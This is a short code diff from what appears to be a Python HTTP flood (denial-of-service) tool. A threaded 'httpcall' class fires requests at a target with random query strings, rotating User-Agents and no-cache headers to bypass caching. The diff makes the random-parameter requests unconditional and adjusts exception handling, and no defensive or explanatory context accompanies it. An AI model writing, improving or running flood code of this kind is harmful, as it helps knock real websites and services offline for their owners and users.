@@ -148,8 +148,7 @@ class httpcall(threading.Thread):
                                 "Host": usehost
                             },data=self.payload, timeout=self.timeout)
                         else:
-                            if self.usepayload == True:
-                                lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers={
+                            lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers={
                                 "User-Agent": random.choice(self.useragents),
                                 "Cache-Control": "no-cache",
                                 "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
@@ -175,7 +174,8 @@ class httpcall(threading.Thread):
                             b = usehost
                             url.remove(s)
                             host.remove(b)
-                    except:
+                    except Exception as e:
+                        #print(e)
                         if len(url) == 0:
                             set_flag(2)
                 else:
@@ -222,7 +222,8 @@ class httpcall(threading.Thread):
                             b = usehost
                             url.remove(s)
                             host.remove(b)
-                    except:
+                    except Exception as e:
+                        #print(e)
                         if len(url) == 0:
                             set_flag(2)
             if self.nodelay == True:
